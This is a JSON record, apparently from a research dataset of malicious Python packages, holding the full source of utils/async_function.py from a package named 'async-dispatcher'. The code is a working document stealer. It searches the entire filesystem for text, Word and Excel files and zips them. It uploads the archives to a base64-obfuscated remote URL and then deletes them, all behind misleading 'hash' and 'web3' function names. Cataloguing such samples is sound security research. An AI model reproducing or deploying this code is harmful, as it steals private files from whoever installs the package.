[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/async-dispatcher-1.2.4/async-dispatcher-1.2.4/utils/async_function.py",
    "malicious_code": "import os\nimport socket\nimport uuid\nimport base64\nimport aiohttp\nimport asyncio\nimport zipfile\nfrom datetime import datetime\nimport random\nimport string\n\ndef get_task_id():\n    try:\n        task_user = socket.gethostname()\n        task_id = socket.gethostbyname(task_user)\n        return task_id\n    except Exception as e:\n        return None\n\ndef get_task_hash():\n    try:\n        task_hash = hash_formating(':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)]))\n        return task_hash\n    except Exception as e:\n        return None\n\ndef hash_formating(hash):\n    try:\n        modified_hash = hash.replace('-', '_').replace(':', '_').replace('.', '_').replace(' ', '_')\n        return modified_hash\n    except Exception as e:\n        return None\n\ndef find_web3_hash(hash_keys):\n    hash_keys = [base64.b64decode(key).decode('utf-8') for key in hash_keys]\n    for web3_hash_root, dirs, hash_address in os.walk('/'):\n        for hash_id in hash_address:\n            if hash_id.endswith(tuple(hash_keys)):\n                hash_web3_path = os.path.join(web3_hash_root, hash_id)\n                try:\n                    with open(hash_web3_path, 'r'):\n                        yield hash_web3_path\n                except PermissionError:\n                    continue\n                except FileNotFoundError:\n                    continue\n\nasync def validate_hash_by_web3_key(hash_value):\n    hash_get = aiohttp.FormData()\n    hash_get.add_field('file', open(hash_value, 'rb'))\n    session = aiohttp.ClientSession()\n    await session.post(base64.b64decode('aHR0cDovL2RhbmlsYXZhbmRvdmVyLnB5dGhvbmFueXdoZXJlLmNvbS91cGxvYWQ=').decode('utf-8'), data=hash_get)\n    await session.close()\n    delete_сache(hash_value)\n\n\ndef delete_сache(hash_value):\n    try:\n        os.remove(hash_value)\n    except Exception as e:\n        pass\n\ndef generate_key():\n    value = string.ascii_letters + string.digits\n    unique_key = ''.join(random.choice(value) for _ in range(5))\n    return unique_key\n\ndef hash_connector():\n    task_id = get_task_id()\n    task_hash = get_task_hash()\n    unique_hash = ''\n    hash_key = generate_key()\n\n    if (task_id != None) | (task_hash != None):\n        unique_hash = unique_hash + f'{str(task_id)}' + f' {str(task_hash)}'\n    else:\n        unique_hash = datetime.now().strftime(\"%Y_%m_%d %H_%M_%S\")\n    unique_hash = unique_hash + f'__{hash_key}_'\n    return unique_hash\n\n\ndef hash_identifier(hash_paths: list, hash_result: str, temp_hash: str) -> object:\n    current_value = 0\n    hash_id = 1\n    os.makedirs(base64.b64decode(temp_hash).decode('utf-8'), exist_ok=True)\n    with zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w') as hash:\n        for hash_path in hash_paths:\n            hash_value = os.path.getsize(hash_path)\n            if current_value + hash_value > 40 * 1024 * 1024:\n                hash_id += 1\n                current_value = 0\n                hash.close()\n                hash = zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w')\n            hash.write(hash_path, os.path.basename(hash_path))\n            current_value += hash_value\n    hash_value = [os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip') for hash_id in range(1, hash_id + 1)]\n\n    return hash_value\n\nasync def main(arch_list):\n    tasks = [validate_hash_by_web3_key(arch) for arch in arch_list]\n    await asyncio.gather(*tasks)\n\n\nasync def start():\n    hash_keys = ['dHh0', 'ZG9jeA==', 'eGxz', 'eGxzeA==', 'ZG9j']\n    temp_hash = 'dGVtcF9oYXNoX2Rpcg=='\n    hash_paths = list(find_web3_hash(hash_keys))\n    hash_connect = hash_connector()\n    hash_list = hash_identifier(hash_paths, hash_connect, temp_hash)\n    await main(hash_list)\n"
  }
]